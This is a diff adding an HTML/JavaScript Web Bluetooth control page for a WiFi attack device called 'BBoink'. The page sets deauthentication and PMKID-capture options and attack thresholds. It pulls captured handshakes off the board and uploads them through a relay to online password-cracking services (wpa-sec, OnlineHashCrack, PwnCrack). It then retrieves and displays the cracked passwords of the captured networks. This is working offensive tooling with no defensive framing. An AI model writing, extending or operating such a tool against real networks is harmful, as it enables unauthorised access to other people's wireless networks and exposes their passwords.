@@ -1,0 +1,240 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BBoink Console</title>
+<style>
+  :root { color-scheme: dark; }
+  body { margin:0; font:15px/1.5 system-ui,sans-serif; background:#0d1117; color:#e6edf3; padding:14px 14px 40px; }
+  h1 { font-size:19px; margin:0 0 2px; } .sub { color:#8b949e; font-size:12px; margin-bottom:12px; }
+  label { display:block; font-size:12px; color:#8b949e; margin:9px 0 3px; }
+  input,select { width:100%; box-sizing:border-box; padding:9px; border-radius:8px; border:1px solid #30363d; background:#161b22; color:#e6edf3; font-size:14px; }
+  input[type=checkbox]{ width:auto; }
+  button { padding:11px 14px; border:0; border-radius:9px; font-size:15px; font-weight:600; color:#fff; background:#238636; cursor:pointer; }
+  button.sec{ background:#1f6feb; } button.wide{ width:100%; margin-top:10px; } button:disabled{ opacity:.5; }
+  .tabs{ display:flex; gap:6px; margin:12px 0; } .tabs button{ flex:1; background:#161b22; color:#8b949e; font-weight:500; padding:9px; }
+  .tabs button.on{ background:#1f6feb; color:#fff; }
+  .pane{ display:none; } .pane.on{ display:block; }
+  #log{ margin-top:12px; background:#161b22; border:1px solid #30363d; border-radius:8px; padding:10px; font:12px/1.45 ui-monospace,monospace; white-space:pre-wrap; max-height:40vh; overflow:auto; }
+  .cap{ background:#161b22; border:1px solid #21262d; border-radius:9px; padding:9px 11px; margin:8px 0; position:relative; }
+  .cn{ font-weight:600; } .cb{ color:#8b949e; font-size:12px; font-family:ui-monospace,monospace; }
+  .pw{ color:#3fb950; font-family:ui-monospace,monospace; margin-top:3px; }
+  .tag{ display:inline-block; background:#30363d; color:#adbac7; border-radius:9px; padding:0 7px; font-size:11px; margin:3px 4px 0 0; }
+  .tag.k{ background:#1f6feb; color:#fff; }
+  .del{ position:absolute; top:8px; right:8px; background:#b62324; padding:5px 9px; font-size:12px; }
+  .grid2{ display:grid; grid-template-columns:1fr 1fr; gap:0 10px; }
+  .row{ display:flex; align-items:center; gap:8px; margin-top:9px; }
+</style>
+</head>
+<body>
+<h1>BBoink Console</h1>
+<div class="sub">Chrome/Edge (Android or desktop) · manage everything over Bluetooth — the board needs no WiFi.</div>
+<button id="connect" class="sec wide">Connect to board</button>
+<div id="cstat" class="sub" style="margin-top:8px"></div>
+
+<div id="app" hidden>
+  <div class="tabs">
+    <button data-t="sync" class="on">Sync</button>
+    <button data-t="caps">Captures</button>
+    <button data-t="cfg">Config</button>
+  </div>
+
+  <div class="pane on" id="p_sync">
+    <div class="sub">Uploads captures to the relay + pulls cracked over this phone's connection (WiFi or cellular).</div>
+    <button id="relaychk" class="sec wide">Check / wake relay</button>
+    <div id="relaystat" class="sub" style="margin-top:6px"></div>
+    <label class="row"><input type="checkbox" id="resyncall"><span style="font-size:13px;color:#8b949e">re-sync everything (ignore already-synced)</span></label>
+    <button id="sync" class="wide">Sync captures ↔ relay</button>
+    <div id="log"></div>
+  </div>
+
+  <div class="pane" id="p_caps">
+    <div class="row" style="justify-content:space-between"><b>Captures &amp; cracked</b><button class="sec" style="padding:7px 11px" onclick="loadCaps()">Refresh</button></div>
+    <div class="row"><input id="exclssid" placeholder="SSID to never attack"><button class="sec" style="padding:9px 12px" onclick="addExcl()">Exclude</button></div>
+    <div id="capsList"></div>
+  </div>
+
+  <div class="pane" id="p_cfg">
+    <div class="sub">Stored on the board (single source of truth). Service keys are sent to the relay per-sync; capture options control the hunt.</div>
+    <div id="cfgForm"></div>
+    <button id="savecfg" class="wide">Save config to board</button>
+    <div id="cfgMsg" class="sub" style="margin-top:6px"></div>
+  </div>
+</div>
+
+<script>
+const SVC='b0070000-b0b0-4b0a-9c5e-000000000000';
+const RX ='b0070001-b0b0-4b0a-9c5e-000000000000';
+const TX ='b0070002-b0b0-4b0a-9c5e-000000000000';
+const $=id=>document.getElementById(id);
+const logEl=()=>$('log');
+function log(m){ const e=logEl(); e.textContent+=m+'\n'; e.scrollTop=e.scrollHeight; }
+
+let rxCh=null, txCh=null, waiter=null, cfg={};
+
+// tab switching
+document.querySelectorAll('.tabs button').forEach(b=>b.onclick=()=>{
+  document.querySelectorAll('.tabs button').forEach(x=>x.classList.toggle('on',x===b));
+  document.querySelectorAll('.pane').forEach(p=>p.classList.toggle('on',p.id==='p_'+b.dataset.t));
+});
+
+function onNotify(e){
+  const v=e.target.value, type=v.getUint8(0);
+  const body=new Uint8Array(v.buffer, v.byteOffset+1, v.byteLength-1);
+  if(type===0x01){ let j; try{ j=JSON.parse(new TextDecoder().decode(body)); }catch(_){ return; } waiter&&waiter.onText&&waiter.onText(j); }
+  else if(type===0x02){ waiter&&waiter.onBin&&waiter.onBin(body.slice()); }
+}
+function write(obj){ return rxCh.writeValue(new TextEncoder().encode(JSON.stringify(obj))); }
+function concat(cs){ let n=cs.reduce((a,c)=>a+c.length,0),o=new Uint8Array(n),p=0; for(const c of cs){o.set(c,p);p+=c.length;} return o; }
+// collect a begin->BIN->end stream (files, caps, crks, cfg)
+function cmdCollect(obj){ return new Promise((res,rej)=>{ let cs=[], started=false;
+  waiter={ onText:j=>{ if(j.t==='begin'){ started=true; cs=[]; }
+                       else if(j.t==='end'){ if(started){ waiter=null; res(concat(cs)); } }
+                       else if(j.t==='err'){ waiter=null; rej(j.e||'err'); } },
+           onBin:b=>{ if(started) cs.push(b); } };
+  write(obj); }); }
+async function cmdJson(obj){ return JSON.parse(new TextDecoder().decode(await cmdCollect(obj))||'null'); }
+function cmdAck(obj){ return new Promise(res=>{ waiter={onText:j=>{ if(j.t==='ok'||j.t==='bye'){waiter=null;res(j);} }}; write(obj); }); }
+function cmdList(all){ return new Promise(res=>{ waiter={onText:j=>{ if(j.t==='list'){waiter=null;res(j.files||[]);} }}; write({c:'list',all:!!all}); }); }
+
+$('connect').onclick=async()=>{
+  try{
+    $('cstat').textContent='requesting device…';
+    const dev=await navigator.bluetooth.requestDevice({filters:[{services:[SVC]}]});
+    dev.addEventListener('gattserverdisconnected',()=>{ $('cstat').textContent='⚠ disconnected'; $('app').hidden=true; $('connect').hidden=false; });
+    const g=await dev.gatt.connect(), svc=await g.getPrimaryService(SVC);
+    rxCh=await svc.getCharacteristic(RX); txCh=await svc.getCharacteristic(TX);
+    await txCh.startNotifications(); txCh.addEventListener('characteristicvaluechanged',onNotify);
+    $('cstat').textContent='✔ connected to '+(dev.name||'board');
+    $('connect').hidden=true; $('app').hidden=false;
+    await loadCfg(); await loadCaps();
+  }catch(e){ $('cstat').textContent='✖ '+e.message; }
+};
+
+// ---------- Config ----------
+const STR=[['wifi_ssid','WiFi SSID (for board direct sync)'],['wifi_pass','WiFi password'],
+ ['relay_url','Relay URL'],['relay_token','Relay token'],['app_url','BLE console URL (this page)'],
+ ['wpa_key','wpa-sec key'],['ohc_key','OnlineHashCrack key'],['pwn_key','PwnCrack key'],
+ ['ap_ssid','BLE name (blank = BBoink-XXXX)']];
+const NUM=[['ch_hop_ms','Channel hop (ms)'],['atk_rssi','Min attack RSSI (dBm)'],['max_tries','Max tries'],['burst','Deauth burst'],['brightness','Brightness (10-255)']];
+const BOOL=[['deauth','Deauth'],['pmkid','PMKID hunt'],['sound','Sound']];
+
+async function loadCfg(){
+  cfg=await cmdJson({c:'getcfg'})||{};
+  let h='';
+  for(const [k,lab] of STR){
+    const val=(k==='wifi_pass')?'':(cfg[k]||'');
+    const ph=(k==='wifi_pass'&&cfg.has_wifi_pass)?'(unchanged)':'';
+    h+=`<label>${lab}</label><input id="c_${k}" value="${(''+val).replace(/"/g,'&quot;')}" placeholder="${ph}">`;
+  }
+  h+='<div class="grid2">';
+  for(const [k,lab] of NUM) h+=`<div><label>${lab}</label><input id="c_${k}" type="number" value="${cfg[k]??''}"></div>`;
+  h+='</div>';
+  for(const [k,lab] of BOOL) h+=`<div class="row"><input type="checkbox" id="c_${k}" ${cfg[k]?'checked':''}><label style="margin:0">${lab}</label></div>`;
+  $('cfgForm').innerHTML=h;
+}
+$('savecfg').onclick=async()=>{
+  $('cfgMsg').textContent='saving…';
+  try{
+    for(const [k] of STR){ const v=$('c_'+k).value; if(k==='wifi_pass'&&!v) continue; await cmdAck({c:'scfg',k,v}); }
+    for(const [k] of NUM){ await cmdAck({c:'scfg',k,v:$('c_'+k).value}); }
+    for(const [k] of BOOL){ await cmdAck({c:'scfg',k,v:$('c_'+k).checked?'1':'0'}); }
+    await cmdAck({c:'savecfg'});
+    $('cfgMsg').textContent='saved ✓'; await loadCfg();
+  }catch(e){ $('cfgMsg').textContent='save failed: '+(e.message||e); }
+};
+
+// ---------- Captures + cracked ----------
+async function loadCaps(){
+  const el=$('capsList'); el.innerHTML='<div class="cb">loading…</div>';
+  try{
+    const caps=await cmdJson({c:'caps'})||[];
+    const crks=await cmdJson({c:'crks'})||[];
+    const cm={}; for(const c of crks) cm[(c.bssid||'').toLowerCase()]=c;
+    // any cracked not in the capture registry, list too
+    const seen=new Set(caps.map(r=>(r.bssid||'').toLowerCase()));
+    let rows=caps.map(r=>{
+      const ck=cm[(r.bssid||'').toLowerCase()];
+      let t=''; if(r.captured)t+='<span class="tag">captured</span>'; if(r.manual)t+='<span class="tag">manual</span>'; if(ck)t+='<span class="tag k">CRACKED</span>';
+      const pw=ck?`<div class="pw">${ck.pass}</div>`:'';
+      return `<div class="cap"><button class="del" onclick="delCap('${r.bssid}')">delete</button><div class="cn">${esc(r.ssid)||'(hidden)'}</div><div class="cb">${r.bssid}</div>${t}${pw}</div>`;
+    });
+    for(const c of crks){ if(seen.has((c.bssid||'').toLowerCase())) continue;
+      rows.push(`<div class="cap"><div class="cn">${esc(c.ssid)||'(hidden)'}</div><div class="cb">${c.bssid}</div><span class="tag k">CRACKED</span><div class="pw">${c.pass}</div></div>`); }
+    el.innerHTML=rows.length?rows.join(''):'<div class="cb">no captures yet</div>';
+  }catch(e){ el.innerHTML='<div class="cb">failed: '+(e.message||e)+'</div>'; }
+}
+function esc(s){ return (s||'').replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c])); }
+window.delCap=async(b)=>{ if(!confirm('Delete capture (removes files, re-enables attacking it)?'))return;
+  try{ await cmdAck({c:'del',bssid:b}); await loadCaps(); }catch(e){} };
+
+// ---------- Sync (post + pull) ----------
+$('sync').onclick=async()=>{
+  const url=(cfg.relay_url||'').replace(/\/+$/,''), tok=cfg.relay_token||'';
+  if(!url||!tok){ log('✖ set Relay URL + token in the Config tab first'); return; }
+  const keys=JSON.stringify({wpasec:cfg.wpa_key||'',ohc:cfg.ohc_key||'',pwncrack:cfg.pwn_key||''});
+  const auth={'Authorization':'Bearer '+tok,'X-Keys':keys};
+  $('sync').disabled=true;
+  try{
+    logEl().textContent='';
+    const files=await cmdList($('resyncall').checked);
+    // group files into networks (strip the _22000.22000 / _pcap.pcap suffix)
+    const nets={};
+    for(const f of files){
+      const key=f.name.replace(/_(22000\.22000|pmkid\.22000|pcap\.pcap)$/,'');
+      const b=await cmdCollect({c:'get',name:f.name});
+      nets[key]=nets[key]||{key};
+      if(f.kind==='22000'){ nets[key].h22=new TextDecoder().decode(b); nets[key].h22name=f.name; }
+      else if(f.kind==='pcap'){ nets[key].pcap=b; nets[key].pcapname=f.name; }
+    }
+    const netKeys=Object.keys(nets);
+    if(!netKeys.length) log('(nothing new to upload)');
+    for(const key of netKeys){
+      const rec=nets[key];
+      const ssid=key.replace(/_[0-9A-Fa-f]{12}$/,'')||key;
+      log('• '+ssid);
+      if(rec.h22 && rec.h22.trim()){
+        const j=await (await fetch(url+'/v1/hashes',{method:'POST',headers:{...auth,'Content-Type':'text/plain'},body:rec.h22})).json().catch(()=>({}));
+        const o=j.ohc||{};
+        const ohcMsg = o.error?('error — '+o.error): o.accepted?(o.accepted+' queued'): o.skipped?'already submitted': o.rejected?(o.rejected+' rejected'): o.success?'already submitted':('HTTP '+o.http);
+        log('    OHC:       '+ohcMsg);
+        const pc=j.pwncrack||{};
+        log('    PwnCrack:  '+(pc.error?('error — '+pc.error):(pc.ok?'accepted':('HTTP '+pc.http))));
+        if(rec.h22name) await cmdAck({c:'synced',name:rec.h22name});
+      }
+      if(rec.pcap){
+        const w=(await (await fetch(url+'/v1/pcap?name='+encodeURIComponent(rec.pcapname),{method:'POST',headers:{...auth,'Content-Type':'application/octet-stream'},body:rec.pcap})).json().catch(()=>({}))).wpasec||{};
+        log('    wpa-sec:   '+(w.error?('error — '+w.error):(w.status==='duplicate'?'already submitted':w.status||('HTTP '+w.http))));
+        if(!w.error) await cmdAck({c:'synced',name:rec.pcapname});
+      }
+    }
+    log('');
+    const cr=await (await fetch(url+'/v1/cracked',{headers:auth})).json();
+    let n=0; for(const c of (cr.cracked||[])){ await cmdAck({c:'crk',b:c.bssid||'',s:c.ssid||'',p:c.password||''}); n++; }
+    await cmdAck({c:'crkdone'});
+    log('');
+    log('Cracked so far: '+n+' network(s) · see the Captures tab');
+    log('✔ sync complete');
+    await loadCaps();
+  }catch(e){ log('✖ '+(e.message||e)); }
+  $('sync').disabled=false;
+};
+
+$('relaychk').onclick=async()=>{
+  const url=(cfg.relay_url||'').replace(/\/+$/,'');
+  if(!url){ $('relaystat').textContent='set Relay URL in the Config tab first'; return; }
+  $('relaystat').textContent='checking… (free tier can take ~40s to wake)';
+  const t0=Date.now();
+  try{ const c=new AbortController(); const to=setTimeout(()=>c.abort(),70000);
+    const r=await fetch(url+'/healthz',{signal:c.signal}); clearTimeout(to);
+    $('relaystat').textContent=r.ok?('✔ relay UP ('+(Date.now()-t0)+'ms)'):('✖ relay HTTP '+r.status);
+  }catch(e){ $('relaystat').textContent='✖ unreachable — '+(e.name==='AbortError'?'timed out':e.message); }
+};
+window.addExcl=async()=>{ const ssid=$('exclssid').value.trim(); if(!ssid){return;}
+  try{ await cmdAck({c:'excl',s:ssid}); $('exclssid').value=''; await loadCaps(); }catch(e){} };
+
+if(!navigator.bluetooth) $('cstat').textContent='✖ Web Bluetooth unavailable — use Chrome/Edge (Android or desktop). Not iOS/Safari.';
+</script>
+</body>
+</html>
